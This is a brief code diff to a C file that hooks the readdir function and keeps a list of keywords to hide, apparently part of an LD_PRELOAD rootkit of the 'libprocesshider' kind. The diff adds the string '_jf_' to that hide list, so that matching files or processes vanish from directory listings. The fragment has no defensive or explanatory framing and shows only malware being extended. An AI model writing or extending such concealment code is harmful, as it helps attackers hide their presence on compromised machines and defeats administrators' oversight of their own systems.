@@ -24,6 +24,7 @@ static readdir_t orig_readdir = NULL;
 static const char *hide_keywords[] = {
     "ld.so.preload",
     "libprocesshider",
+    "_jf_",
     NULL,
 };
 
